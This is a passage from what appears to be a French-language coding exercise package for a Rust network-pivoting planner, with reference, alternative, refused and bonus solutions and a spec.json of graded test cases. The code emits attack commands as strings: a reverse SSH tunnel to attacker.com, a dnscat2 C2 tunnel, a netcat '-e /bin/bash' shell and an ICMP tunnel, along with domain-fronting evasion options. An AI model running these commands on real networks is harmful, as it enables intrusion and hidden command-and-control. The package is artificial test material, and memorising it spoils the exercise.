            PortSpec::Any(s) => s == "*",
        }
    }

    fn is_any(&self) -> bool {
        matches!(self, PortSpec::Any(s) if s == "*")
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Target {
    pub segment: String,
    pub ip: String,
    pub port: u16,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Attacker {
    pub segment: String,
    pub ip: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StealthOptions {
    pub cdn_endpoints: Vec<String>,
    pub cloud_endpoints: Vec<String>,
    pub doh_servers: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PivotOutput {
    pub pivot_paths: Vec<PivotPath>,
    pub tunnel_recommendations: Vec<TunnelRecommendation>,
    pub stealth_options: Vec<StealthOption>,
    pub optimal_plan: OptimalPlan,
    pub warnings: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PivotPath {
    pub path_id: u32,
    pub hops: Vec<String>,
    pub feasible: bool,
    pub blocked_by: Option<String>,
    pub total_depth: usize,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Hop {
    pub from: String,
    pub to: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TunnelRecommendation {
    pub hop: Hop,
    pub technique: String,
    pub command: String,
    pub via_host: Option<String>,
    pub ports_required: Vec<u16>,
    pub stealth_score: u8,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StealthOption {
    #[serde(rename = "type")]
    pub option_type: String,
    pub cdn: Option<String>,
    pub real_c2: Option<String>,
    pub server: Option<String>,
    pub effectiveness: String,
    pub detection_risk: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OptimalPlan {
    pub total_hops: usize,
    pub estimated_detection_risk: String,
    pub commands: Vec<String>,
}

// ============ FONCTIONS PRINCIPALES ============

/// Construit le graphe du rÃ©seau Ã  partir de la topologie
pub fn build_network_graph(topology: &NetworkTopology) -> HashMap<String, Vec<String>> {
    let mut graph: HashMap<String, Vec<String>> = HashMap::new();

    // Initialiser tous les segments
    for segment in &topology.segments {
        graph.entry(segment.id.clone()).or_insert_with(Vec::new);
    }

    // Ajouter les liens
    for link in &topology.links {
        graph.entry(link.from.clone())
            .or_insert_with(Vec::new)
            .push(link.to.clone());

        if link.bidirectional {
            graph.entry(link.to.clone())
                .or_insert_with(Vec::new)
                .push(link.from.clone());
        }
    }

    graph
}

/// Trouve tous les chemins entre deux segments (BFS)
pub fn find_all_paths(
    graph: &HashMap<String, Vec<String>>,
    start: &str,
    end: &str
) -> Vec<Vec<String>> {
    let mut all_paths = Vec::new();
    let mut queue: VecDeque<Vec<String>> = VecDeque::new();

    queue.push_back(vec![start.to_string()]);

    while let Some(path) = queue.pop_front() {
        let current = path.last().unwrap();

        if current == end {
            all_paths.push(path);
            continue;
        }

        if let Some(neighbors) = graph.get(current) {
            for neighbor in neighbors {
                if !path.contains(neighbor) {
                    let mut new_path = path.clone();
                    new_path.push(neighbor.clone());
                    queue.push_back(new_path);
                }
            }
        }
    }

    // Trier par longueur (plus court d'abord)
    all_paths.sort_by(|a, b| a.len().cmp(&b.len()));
    all_paths
}

/// VÃ©rifie les rÃ¨gles firewall pour une transition
pub fn check_firewall_rules(
    rules: &[FirewallConfig],
    from: &str,
    to: &str,
    port: u16,
    protocol: &str
) -> (bool, Vec<u16>) {
    // Trouver la config firewall pour cette paire de segments
    let config = rules.iter()
        .find(|c| c.from_segment == from && c.to_segment == to);

    let config = match config {
        Some(c) => c,
        None => return (true, vec![port]), // Pas de firewall = autorisÃ©
    };

    // Collecter les ports autorisÃ©s
    let mut allowed_ports = Vec::new();

    for rule in &config.rules {
        let port_matches = rule.port.matches(port) || rule.port.is_any();
        let proto_matches = rule.protocol == protocol || rule.protocol == "*";

        if port_matches && proto_matches {
            if rule.action == "allow" {
                allowed_ports.push(port);
                return (true, allowed_ports);
            } else {
                // Deny - mais continuer pour collecter les ports autorisÃ©s
            }
        }

        // Collecter tous les ports autorisÃ©s
        if rule.action == "allow" {
            if let PortSpec::Single(p) = rule.port {
                allowed_ports.push(p);
            }
        }
    }

    // Si on arrive ici, soit deny explicite, soit pas de rÃ¨gle match
    if allowed_ports.is_empty() {
        (false, vec![])
    } else {
        (false, allowed_ports)
    }
}

/// Obtient les hÃ´tes compromis dans un segment
pub fn get_hosts_in_segment<'a>(
    hosts: &'a [CompromisedHost],
    segment: &str
) -> Vec<&'a CompromisedHost> {
    hosts.iter()
        .filter(|h| h.segment == segment)
        .collect()
}

/// Recommande une technique de tunneling
pub fn recommend_tunnel_technique(
    host: &CompromisedHost,
    allowed_ports: &[u16],
    from_segment: &str,
    to_segment: &str,
    target_port: u16,
) -> TunnelRecommendation {
    let has_ssh = host.capabilities.contains(&"ssh".to_string());
    let has_nc = host.capabilities.contains(&"nc".to_string());
    let has_python = host.capabilities.contains(&"python".to_string());
    let has_curl = host.capabilities.contains(&"curl".to_string());

    // DÃ©terminer la technique basÃ©e sur les capacitÃ©s et ports
    let (technique, command, stealth_score) = if allowed_ports.contains(&443) {
        if has_ssh {
            (
                "reverse_ssh_over_https".to_string(),
                format!(
                    "ssh -o 'ProxyCommand=openssl s_client -connect {}:443 -quiet' -R 9050:localhost:9050 attacker@attacker.com",
                    host.ip
                ),
                8
            )
        } else if has_python {
            (
                "python_https_tunnel".to_string(),
                "python3 -c 'import ssl,socket...'".to_string(),
                7
            )
        } else {
            (
                "https_tunnel".to_string(),
                format!("curl -X CONNECT https://{}:443", host.ip),
                6
            )
        }
    } else if allowed_ports.contains(&22) && has_ssh {
        (
            "ssh_dynamic".to_string(),
            format!("ssh -D 1080 user@{}", host.ip),
            5
        )
    } else if allowed_ports.contains(&53) {
        (
            "dns_tunnel".to_string(),
            "dnscat2 c2.attacker.com".to_string(),
            9
        )
    } else if has_nc {
        let port = allowed_ports.first().copied().unwrap_or(8080);
        (
            "netcat_relay".to_string(),
            format!("nc -lvp {} -e /bin/bash", port),
            3
        )
    } else {
        (
            "unknown".to_string(),
            "Manual pivoting required".to_string(),
            1
        )
    };

    TunnelRecommendation {
        hop: Hop {
            from: from_segment.to_string(),
            to: to_segment.to_string(),
        },
        technique,
        command,
        via_host: Some(host.id.clone()),
        ports_required: allowed_ports.to_vec(),
        stealth_score,
    }
}

/// Ã‰value les options de stealth
pub fn evaluate_stealth_options(
    options: &StealthOptions,
    _path: &[String]
) -> Vec<StealthOption> {
    let mut stealth_opts = Vec::new();

    // Domain fronting via CDN
    for cdn in &options.cdn_endpoints {
        stealth_opts.push(StealthOption {
            option_type: "domain_fronting".to_string(),
            cdn: Some(cdn.clone()),
            real_c2: Some(format!("hidden.{}", cdn)),
            server: None,
            effectiveness: "high".to_string(),
            detection_risk: "low".to_string(),
        });
    }

    // Cloud C2
    for cloud in &options.cloud_endpoints {
        stealth_opts.push(StealthOption {
            option_type: "cloud_c2".to_string(),
            cdn: None,
            real_c2: None,
            server: Some(cloud.clone()),
            effectiveness: "medium".to_string(),
            detection_risk: "medium".to_string(),
        });
    }

    // DNS over HTTPS
    for doh in &options.doh_servers {
        stealth_opts.push(StealthOption {
            option_type: "doh_tunnel".to_string(),
            cdn: None,
            real_c2: None,
            server: Some(doh.clone()),
            effectiveness: "medium".to_string(),
            detection_risk: "low".to_string(),
        });
    }

    stealth_opts
}

/// GÃ©nÃ¨re le plan optimal
pub fn generate_optimal_plan(
    paths: &[PivotPath],
    tunnels: &[TunnelRecommendation]
) -> OptimalPlan {
    // Trouver le chemin faisable le plus court
    let best_path = paths.iter()
        .filter(|p| p.feasible)
        .min_by_key(|p| p.hops.len());

    let (total_hops, commands) = match best_path {
        Some(path) => {
            let mut cmds = Vec::new();
            for (i, tunnel) in tunnels.iter().enumerate() {
                cmds.push(format!(
                    "Step {}: {} -> {}: {}",
                    i + 1,
                    tunnel.hop.from,
                    tunnel.hop.to,
                    tunnel.command
                ));
            }
            (path.hops.len() - 1, cmds)
        }
        None => (0, vec!["No feasible path found".to_string()]),
    };

    // Calculer le risque basÃ© sur les scores de stealth
    let avg_stealth = if tunnels.is_empty() {
        0.0
    } else {
        tunnels.iter().map(|t| t.stealth_score as f64).sum::<f64>() / tunnels.len() as f64
    };

    let detection_risk = if avg_stealth >= 7.0 {
        "low"
    } else if avg_stealth >= 4.0 {
        "medium"
    } else {
        "high"
    };

    OptimalPlan {
        total_hops,
        estimated_detection_risk: detection_risk.to_string(),
        commands,
    }
}

/// Fonction principale d'analyse
pub fn analyze_pivoting(input: &PivotInput) -> PivotOutput {
    let mut warnings = Vec::new();

    // 1. Construire le graphe
    let graph = build_network_graph(&input.network_topology);

    // 2. Trouver tous les chemins
    let all_paths = find_all_paths(&graph, &input.attacker.segment, &input.target.segment);

    // 3. Analyser chaque chemin
    let mut pivot_paths = Vec::new();
    let mut tunnel_recommendations = Vec::new();

    for (idx, path) in all_paths.iter().enumerate() {
        let mut feasible = true;
        let mut blocked_by = None;

        // VÃ©rifier chaque saut
        for i in 0..path.len() - 1 {
            let from = &path[i];
            let to = &path[i + 1];

            // VÃ©rifier les hÃ´tes compromis dans le segment source
            let hosts_in_from = get_hosts_in_segment(&input.compromised_hosts, from);

            // Pour le premier saut (attacker), pas besoin d'hÃ´te compromis
            if i > 0 && hosts_in_from.is_empty() {
                feasible = false;
                blocked_by = Some(format!("No compromised host in segment {}", from));
                break;
            }

            // VÃ©rifier le firewall
            let (allowed, allowed_ports) = check_firewall_rules(
                &input.firewall_rules,
                from,
                to,
                input.target.port,
                "tcp"
            );

            if !allowed && allowed_ports.is_empty() {
                feasible = false;
                blocked_by = Some(format!("Firewall {} -> {} blocks all traffic", from, to));
                warnings.push(format!("{}->{}: Firewall denies all ports", from, to));
                break;
            }

            if !allowed && !allowed_ports.is_empty() {
                warnings.push(format!(
                    "{}->{}: Target port {} blocked, but ports {:?} are allowed",
                    from, to, input.target.port, allowed_ports
                ));
            }

            // Recommander une technique de tunneling
            if let Some(host) = hosts_in_from.first() {
                let tunnel = recommend_tunnel_technique(
                    host,
                    &allowed_ports,
                    from,
                    to,
                    input.target.port,
                );
                tunnel_recommendations.push(tunnel);
            } else if i == 0 {
                // Premier saut depuis l'attaquant
                tunnel_recommendations.push(TunnelRecommendation {
                    hop: Hop {
                        from: from.clone(),
                        to: to.clone(),
                    },
                    technique: "direct".to_string(),
                    command: format!("Connect to {} via allowed port", to),
                    via_host: None,
                    ports_required: allowed_ports.clone(),
                    stealth_score: 5,
                });
            }
        }

        pivot_paths.push(PivotPath {
            path_id: (idx + 1) as u32,
            hops: path.clone(),
            feasible,
            blocked_by,
            total_depth: path.len() - 1,
        });
    }

    // 4. Ã‰valuer les options stealth
    let stealth_options = if let Some(best_path) = pivot_paths.iter().find(|p| p.feasible) {
        evaluate_stealth_options(&input.stealth_options, &best_path.hops)
    } else {
        Vec::new()
    };

    // 5. GÃ©nÃ©rer le plan optimal
    let optimal_plan = generate_optimal_plan(&pivot_paths, &tunnel_recommendations);

    PivotOutput {
        pivot_paths,
        tunnel_recommendations,
        stealth_options,
        optimal_plan,
        warnings,
    }
}

fn main() {
    let input: PivotInput = serde_json::from_reader(std::io::stdin()).expect("Invalid JSON");
    let output = analyze_pivoting(&input);
    println!("{}", serde_json::to_string_pretty(&output).unwrap());
}
```

### 4.4 Solutions alternatives acceptÃ©es

```rust
// Alternative 1: Utilisation de Dijkstra avec poids (dÃ©tection risk)
pub fn find_optimal_path_dijkstra(
    graph: &HashMap<String, Vec<String>>,
    weights: &HashMap<(String, String), f64>,
    start: &str,
    end: &str
) -> Option<(Vec<String>, f64)> {
    use std::collections::BinaryHeap;
    use std::cmp::Ordering;

    #[derive(Clone, PartialEq)]
    struct State {
        cost: f64,
        node: String,
        path: Vec<String>,
    }

    impl Eq for State {}

    impl Ord for State {
        fn cmp(&self, other: &Self) -> Ordering {
            other.cost.partial_cmp(&self.cost).unwrap_or(Ordering::Equal)
        }
    }

    impl PartialOrd for State {
        fn partial_cmp(&self, other: &Self) -> Option<Ordering> {
            Some(self.cmp(other))
        }
    }

    let mut heap = BinaryHeap::new();
    let mut visited = HashSet::new();

    heap.push(State {
        cost: 0.0,
        node: start.to_string(),
        path: vec![start.to_string()],
    });

    while let Some(State { cost, node, path }) = heap.pop() {
        if node == end {
            return Some((path, cost));
        }

        if visited.contains(&node) {
            continue;
        }
        visited.insert(node.clone());

        if let Some(neighbors) = graph.get(&node) {
            for neighbor in neighbors {
                if !visited.contains(neighbor) {
                    let edge_weight = weights
                        .get(&(node.clone(), neighbor.clone()))
                        .copied()
                        .unwrap_or(1.0);

                    let mut new_path = path.clone();
                    new_path.push(neighbor.clone());

                    heap.push(State {
                        cost: cost + edge_weight,
                        node: neighbor.clone(),
                        path: new_path,
                    });
                }
            }
        }
    }

    None
}

// Alternative 2: DFS itÃ©ratif avec memoization
pub fn find_paths_dfs(
    graph: &HashMap<String, Vec<String>>,
    start: &str,
    end: &str,
    max_depth: usize
) -> Vec<Vec<String>> {
    let mut results = Vec::new();
    let mut stack = vec![(vec![start.to_string()], HashSet::from([start.to_string()]))];

    while let Some((path, visited)) = stack.pop() {
        let current = path.last().unwrap();

        if current == end {
            results.push(path);
            continue;
        }

        if path.len() >= max_depth {
            continue;
        }

        if let Some(neighbors) = graph.get(current) {
            for neighbor in neighbors {
                if !visited.contains(neighbor) {
                    let mut new_path = path.clone();
                    new_path.push(neighbor.clone());
                    let mut new_visited = visited.clone();
                    new_visited.insert(neighbor.clone());
                    stack.push((new_path, new_visited));
                }
            }
        }
    }

    results
}
```

### 4.5 Solutions refusÃ©es

```rust
// âŒ REFUSÃ‰ 1: Ne vÃ©rifie pas les firewalls
// Trouve les chemins mais ignore les rÃ¨gles de filtrage
pub fn analyze_pivoting_bad1(input: &PivotInput) -> PivotOutput {
    let graph = build_network_graph(&input.network_topology);
    let paths = find_all_paths(&graph, &input.attacker.segment, &input.target.segment);

    // ERREUR: Tous les chemins sont considÃ©rÃ©s faisables!
    let pivot_paths: Vec<PivotPath> = paths.iter().enumerate()
        .map(|(i, p)| PivotPath {
            path_id: (i + 1) as u32,
            hops: p.clone(),
            feasible: true,  // â† FAUX! Ne vÃ©rifie pas le firewall
            blocked_by: None,
            total_depth: p.len() - 1,
        })
        .collect();

    // ...
}
// Pourquoi c'est faux: Un chemin peut exister topologiquement mais Ãªtre
// bloquÃ© par un firewall. Sans cette vÃ©rification, le plan est invalide.

// âŒ REFUSÃ‰ 2: Ignore les hÃ´tes compromis
// Un pivot n'est possible que si on a un point d'appui
pub fn analyze_pivoting_bad2(input: &PivotInput) -> PivotOutput {
    // ...
    for i in 0..path.len() - 1 {
        let from = &path[i];
        let to = &path[i + 1];

        // ERREUR: Ne vÃ©rifie pas s'il y a un hÃ´te compromis dans 'from'
        // pour servir de point de pivot

        let tunnel = TunnelRecommendation {
            hop: Hop { from: from.clone(), to: to.clone() },
            technique: "ssh".to_string(),
            command: "ssh user@target".to_string(),
            via_host: None,  // â† Pas d'hÃ´te! Comment pivoter?
            // ...
        };
    }
    // ...
}
// Pourquoi c'est faux: Sans hÃ´te compromis dans un segment intermÃ©diaire,
// on ne peut pas Ã©tablir de tunnel depuis ce segment.

// âŒ REFUSÃ‰ 3: Chemins avec cycles
pub fn find_all_paths_bad(
    graph: &HashMap<String, Vec<String>>,
    start: &str,
    end: &str
) -> Vec<Vec<String>> {
    let mut all_paths = Vec::new();
    let mut queue: VecDeque<Vec<String>> = VecDeque::new();

    queue.push_back(vec![start.to_string()]);

    while let Some(path) = queue.pop_front() {
        let current = path.last().unwrap();

        if current == end {
            all_paths.push(path);
            continue;
        }

        if let Some(neighbors) = graph.get(current) {
            for neighbor in neighbors {
                // ERREUR: Ne vÃ©rifie pas si le nÅ“ud est dÃ©jÃ  dans le chemin
                let mut new_path = path.clone();
                new_path.push(neighbor.clone());
                queue.push_back(new_path);  // â† Boucle infinie possible!
            }
        }
    }

    all_paths
}
// Pourquoi c'est faux: Dans un graphe avec cycles (Aâ†’Bâ†’Câ†’A),
// cette fonction boucle infiniment.

// âŒ REFUSÃ‰ 4: Mauvaise Ã©valuation des rÃ¨gles firewall (last-match au lieu de first-match)
pub fn check_firewall_rules_bad(
    rules: &[FirewallConfig],
    from: &str,
    to: &str,
    port: u16,
    protocol: &str
) -> bool {
    let config = rules.iter()
        .find(|c| c.from_segment == from && c.to_segment == to);

    if config.is_none() {
        return true;
    }

    let config = config.unwrap();
    let mut result = false;

    // ERREUR: Prend la DERNIÃˆRE rÃ¨gle qui match, pas la premiÃ¨re
    for rule in &config.rules {
        if rule.port.matches(port) && rule.protocol == protocol {
            result = rule.action == "allow";
            // Continue au lieu de return immÃ©diat!
        }
    }

    result
}
// Pourquoi c'est faux: Les firewalls utilisent first-match.
// [allow 22, deny *] avec port 22 â†’ devrait allow, pas deny

// âŒ REFUSÃ‰ 5: Stealth score toujours maximal
pub fn recommend_tunnel_technique_bad(
    host: &CompromisedHost,
    allowed_ports: &[u16],
) -> TunnelRecommendation {
    TunnelRecommendation {
        hop: Hop { from: "".to_string(), to: "".to_string() },
        technique: "ssh".to_string(),
        command: "ssh user@target".to_string(),
        via_host: Some(host.id.clone()),
        ports_required: allowed_ports.to_vec(),
        stealth_score: 10,  // â† Toujours 10! Pas de distinction
    }
}
// Pourquoi c'est faux: Le score de stealth doit reflÃ©ter la
// dÃ©tectabilitÃ© rÃ©elle (DNS tunnel > HTTPS > SSH > NetCat)
```

### 4.6 Solution bonus de rÃ©fÃ©rence

```rust
use std::collections::{HashMap, HashSet, VecDeque, BinaryHeap};
use std::cmp::Ordering;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdvancedOptions {
    pub redundancy_level: usize,
    pub max_detection_score: f64,
    pub covert_channels_enabled: bool,
    pub timing_jitter_ms: (u64, u64),
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdvancedPivotOutput {
    pub base_output: PivotOutput,
    pub redundant_paths: Vec<RedundantPathSet>,
    pub covert_channels: Vec<CovertChannel>,
    pub timing_profile: TimingProfile,
    pub total_cost: f64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RedundantPathSet {
    pub primary: Vec<String>,
    pub fallbacks: Vec<Vec<String>>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CovertChannel {
    pub channel_type: String,
    pub bandwidth_kbps: f64,
    pub detection_risk: String,
    pub setup_command: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TimingProfile {
    pub min_delay_ms: u64,
    pub max_delay_ms: u64,
    pub jitter_pattern: String,
}

/// Trouve K chemins disjoints (vertex-disjoint)
pub fn find_k_disjoint_paths(
    graph: &HashMap<String, Vec<String>>,
    start: &str,
    end: &str,
    k: usize
) -> Vec<Vec<String>> {
    let mut disjoint_paths = Vec::new();
    let mut used_nodes: HashSet<String> = HashSet::new();

    // Toujours garder start et end disponibles
    used_nodes.insert(start.to_string());
    used_nodes.insert(end.to_string());

    for _ in 0..k {
        // CrÃ©er un graphe filtrÃ© (sans les nÅ“uds dÃ©jÃ  utilisÃ©s sauf start/end)
        let filtered_graph: HashMap<String, Vec<String>> = graph.iter()
            .filter(|(node, _)| {
                *node == start || *node == end || !used_nodes.contains(*node)
            })
            .map(|(node, neighbors)| {
                let filtered_neighbors: Vec<String> = neighbors.iter()
                    .filter(|n| *n == start || *n == end || !used_nodes.contains(*n))
                    .cloned()
                    .collect();
                (node.clone(), filtered_neighbors)
            })
            .collect();

        // Trouver le plus court chemin dans le graphe filtrÃ©
        if let Some(path) = find_shortest_path(&filtered_graph, start, end) {
            // Marquer les nÅ“uds intermÃ©diaires comme utilisÃ©s
            for node in &path[1..path.len()-1] {
                used_nodes.insert(node.clone());
            }
            disjoint_paths.push(path);
        } else {
            break; // Plus de chemins disjoints disponibles
        }
    }

    disjoint_paths
}

fn find_shortest_path(
    graph: &HashMap<String, Vec<String>>,
    start: &str,
    end: &str
) -> Option<Vec<String>> {
    let mut queue = VecDeque::new();
    let mut visited = HashSet::new();

    queue.push_back(vec![start.to_string()]);
    visited.insert(start.to_string());

    while let Some(path) = queue.pop_front() {
        let current = path.last().unwrap();

        if current == end {
            return Some(path);
        }

        if let Some(neighbors) = graph.get(current) {
            for neighbor in neighbors {
                if !visited.contains(neighbor) {
                    visited.insert(neighbor.clone());
                    let mut new_path = path.clone();
                    new_path.push(neighbor.clone());
                    queue.push_back(new_path);
                }
            }
        }
    }

    None
}

/// Identifie les canaux cachÃ©s possibles
pub fn identify_covert_channels(
    firewall_rules: &[FirewallConfig],
    path: &[String]
) -> Vec<CovertChannel> {
    let mut channels = Vec::new();

    for i in 0..path.len() - 1 {
        let from = &path[i];
        let to = &path[i + 1];

        // Trouver les rÃ¨gles pour ce saut
        let config = firewall_rules.iter()
            .find(|c| c.from_segment == *from && c.to_segment == *to);

        if let Some(config) = config {
            // VÃ©rifier les ports qui permettent des canaux cachÃ©s
            for rule in &config.rules {
                if rule.action == "allow" {
                    match &rule.port {
                        PortSpec::Single(53) => {
                            channels.push(CovertChannel {
                                channel_type: "dns_txt".to_string(),
                                bandwidth_kbps: 5.0,
                                detection_risk: "low".to_string(),
                                setup_command: "dnscat2 --dns domain.com".to_string(),
                            });
                        }
                        PortSpec::Single(80) | PortSpec::Single(443) => {
                            channels.push(CovertChannel {
                                channel_type: "http_headers".to_string(),
                                bandwidth_kbps: 20.0,
                                detection_risk: "medium".to_string(),
                                setup_command: "custom HTTP header exfiltration".to_string(),
                            });
                        }
                        _ => {}
                    }
                }
            }

            // ICMP souvent autorisÃ© implicitement
            channels.push(CovertChannel {
                channel_type: "icmp_payload".to_string(),
                bandwidth_kbps: 10.0,
                detection_risk: "medium".to_string(),
                setup_command: "ptunnel -p proxy -lp 8000 -da target -dp 22".to_string(),
            });
        }
    }

    channels
}

/// Calcule le coÃ»t total d'un chemin
pub fn calculate_path_cost(
    path: &[String],
    tunnels: &[TunnelRecommendation],
    detection_weights: &HashMap<String, f64>
) -> f64 {
    let mut total_cost = 0.0;

    // CoÃ»t basÃ© sur le nombre de sauts
    total_cost += (path.len() - 1) as f64 * 1.0;

    // CoÃ»t basÃ© sur les techniques de tunneling
    for tunnel in tunnels {
        let technique_cost = detection_weights
            .get(&tunnel.technique)
            .copied()
            .unwrap_or(5.0);

        // Inverser le score de stealth (plus haut = moins de coÃ»t)
        let stealth_factor = 1.0 / (tunnel.stealth_score as f64 + 1.0);

        total_cost += technique_cost * stealth_factor;
    }

    total_cost
}

/// Analyse avancÃ©e avec redondance et canaux cachÃ©s
pub fn analyze_pivoting_advanced(
    input: &PivotInput,
    advanced: &AdvancedOptions
) -> AdvancedPivotOutput {
    // Analyse de base
    let base_output = analyze_pivoting(input);

    // Graphe du rÃ©seau
    let graph = build_network_graph(&input.network_topology);

    // Trouver K chemins disjoints
    let disjoint_paths = find_k_disjoint_paths(
        &graph,
        &input.attacker.segment,
        &input.target.segment,
        advanced.redundancy_level
    );

    // Construire les ensembles de chemins redondants
    let redundant_paths = if disjoint_paths.is_empty() {
        Vec::new()
    } else {
        vec![RedundantPathSet {
            primary: disjoint_paths[0].clone(),
            fallbacks: disjoint_paths[1..].to_vec(),
        }]
    };

    // Identifier les canaux cachÃ©s
    let covert_channels = if advanced.covert_channels_enabled {
        let primary_path = disjoint_paths.first()
            .map(|p| p.as_slice())
            .unwrap_or(&[]);
        identify_covert_channels(&input.firewall_rules, primary_path)
    } else {
        Vec::new()
    };

    // Profil de timing
    let timing_profile = TimingProfile {
        min_delay_ms: advanced.timing_jitter_ms.0,
        max_delay_ms: advanced.timing_jitter_ms.1,
        jitter_pattern: "exponential".to_string(),
    };

    // Calculer le coÃ»t total
    let detection_weights: HashMap<String, f64> = [
        ("dns_tunnel".to_string(), 2.0),
        ("reverse_ssh_over_https".to_string(), 3.0),
        ("ssh_dynamic".to_string(), 5.0),
        ("netcat_relay".to_string(), 8.0),
    ].into_iter().collect();

    let total_cost = disjoint_paths.first()
        .map(|path| calculate_path_cost(path, &base_output.tunnel_recommendations, &detection_weights))
        .unwrap_or(f64::INFINITY);

    AdvancedPivotOutput {
        base_output,
        redundant_paths,
        covert_channels,
        timing_profile,
        total_cost,
    }
}
```

### 4.9 spec.json

```json
{
  "name": "pivot_master",
  "language": "rust",
  "type": "code",
  "tier": 2,
  "tier_info": "MÃ©lange (concepts i + j + k + l)",
  "tags": ["network", "pivoting", "tunneling", "security", "phase3"],
  "passing_score": 70,

  "function": {
    "name": "analyze_pivoting",
    "prototype": "pub fn analyze_pivoting(input: &PivotInput) -> PivotOutput",
    "return_type": "PivotOutput",
    "parameters": [
      {"name": "input", "type": "&PivotInput"}
    ]
  },

  "driver": {
    "reference": "pub fn ref_analyze_pivoting(input: &PivotInput) -> PivotOutput { let graph = build_network_graph(&input.network_topology); let paths = find_all_paths(&graph, &input.attacker.segment, &input.target.segment); let mut pivot_paths = Vec::new(); let mut tunnels = Vec::new(); let mut warnings = Vec::new(); for (idx, path) in paths.iter().enumerate() { let mut feasible = true; let mut blocked_by = None; for i in 0..path.len()-1 { let hosts = get_hosts_in_segment(&input.compromised_hosts, &path[i]); if i > 0 && hosts.is_empty() { feasible = false; blocked_by = Some(format!(\"No host in {}\", path[i])); break; } let (allowed, ports) = check_firewall_rules(&input.firewall_rules, &path[i], &path[i+1], input.target.port, \"tcp\"); if !allowed && ports.is_empty() { feasible = false; blocked_by = Some(format!(\"FW blocks {}->{}\", path[i], path[i+1])); break; } if let Some(h) = hosts.first() { tunnels.push(recommend_tunnel_technique(h, &ports, &path[i], &path[i+1], input.target.port)); } } pivot_paths.push(PivotPath { path_id: (idx+1) as u32, hops: path.clone(), feasible, blocked_by, total_depth: path.len()-1 }); } let stealth = evaluate_stealth_options(&input.stealth_options, &[]); let plan = generate_optimal_plan(&pivot_paths, &tunnels); PivotOutput { pivot_paths, tunnel_recommendations: tunnels, stealth_options: stealth, optimal_plan: plan, warnings } }",

    "edge_cases": [
      {
        "name": "simple_linear_path",
        "args": [{"network_topology": {"segments": [{"id": "A", "cidr": "10.0.1.0/24", "description": "Start"}, {"id": "B", "cidr": "10.0.2.0/24", "description": "End"}], "links": [{"from": "A", "to": "B", "bidirectional": true}]}, "compromised_hosts": [{"id": "h1", "segment": "A", "ip": "10.0.1.10", "capabilities": ["ssh"], "access_level": "root"}], "firewall_rules": [], "target": {"segment": "B", "ip": "10.0.2.50", "port": 22}, "attacker": {"segment": "A", "ip": "10.0.1.100"}, "stealth_options": {"cdn_endpoints": [], "cloud_endpoints": [], "doh_servers": []}}],
        "expected_paths_count": 1,
        "expected_feasible": true
      },
      {
        "name": "blocked_by_firewall",
        "args": [{"network_topology": {"segments": [{"id": "A", "cidr": "10.0.1.0/24", "description": "Start"}, {"id": "B", "cidr": "10.0.2.0/24", "description": "End"}], "links": [{"from": "A", "to": "B", "bidirectional": true}]}, "compromised_hosts": [], "firewall_rules": [{"id": "fw1", "from_segment": "A", "to_segment": "B", "rules": [{"action": "deny", "port": "*", "protocol": "*"}]}], "target": {"segment": "B", "ip": "10.0.2.50", "port": 22}, "attacker": {"segment": "A", "ip": "10.0.1.100"}, "stealth_options": {"cdn_endpoints": [], "cloud_endpoints": [], "doh_servers": []}}],
        "expected_feasible": false,
        "is_trap": true,
        "trap_explanation": "Firewall bloque tout le trafic"
      },
      {
        "name": "no_path_exists",
        "args": [{"network_topology": {"segments": [{"id": "A", "cidr": "10.0.1.0/24", "description": "Start"}, {"id": "B", "cidr": "10.0.2.0/24", "description": "End"}], "links": []}, "compromised_hosts": [], "firewall_rules": [], "target": {"segment": "B", "ip": "10.0.2.50", "port": 22}, "attacker": {"segment": "A", "ip": "10.0.1.100"}, "stealth_options": {"cdn_endpoints": [], "cloud_endpoints": [], "doh_servers": []}}],
        "expected_paths_count": 0,
        "is_trap": true,
        "trap_explanation": "Pas de lien entre les segments"
      },
      {
        "name": "multi_hop_with_pivot",
        "args": [{"network_topology": {"segments": [{"id": "A", "cidr": "10.0.1.0/24", "description": "Start"}, {"id": "B", "cidr": "10.0.2.0/24", "description": "Middle"}, {"id": "C", "cidr": "10.0.3.0/24", "description": "End"}], "links": [{"from": "A", "to": "B", "bidirectional": true}, {"from": "B", "to": "C", "bidirectional": true}]}, "compromised_hosts": [{"id": "h1", "segment": "B", "ip": "10.0.2.10", "capabilities": ["ssh", "nc"], "access_level": "user"}], "firewall_rules": [], "target": {"segment": "C", "ip": "10.0.3.50", "port": 22}, "attacker": {"segment": "A", "ip": "10.0.1.100"}, "stealth_options": {"cdn_endpoints": [], "cloud_endpoints": [], "doh_servers": []}}],
        "expected_hops": ["A", "B", "C"],
        "expected_feasible": true
      },
      {
        "name": "stealth_options_detected",
        "args": [{"network_topology": {"segments": [{"id": "A", "cidr": "10.0.1.0/24", "description": "Start"}], "links": []}, "compromised_hosts": [], "firewall_rules": [], "target": {"segment": "A", "ip": "10.0.1.50", "port": 22}, "attacker": {"segment": "A", "ip": "10.0.1.100"}, "stealth_options": {"cdn_endpoints": ["cloudfront.net"], "cloud_endpoints": ["*.amazonaws.com"], "doh_servers": ["dns.google"]}}],
        "expected_stealth_count_min": 3
      }
    ],

    "fuzzing": {
      "enabled": true,
      "iterations": 100,
      "generators": [
        {
          "type": "custom",
          "param_index": 0,
          "generator": "network_topology_generator",
          "params": {
            "min_segments": 2,
            "max_segments": 10,
            "link_probability": 0.3
          }
        }
      ]
    }
  },

  "norm": {
    "allowed_functions": ["HashMap", "HashSet", "VecDeque", "BinaryHeap", "serde_json"],
    "forbidden_functions": ["std::net", "tokio", "async-std", "petgraph"],
    "check_security": true,
    "check_memory": true,
    "blocking": true
  }
}
```

### 4.10 Solutions Mutantes

```rust
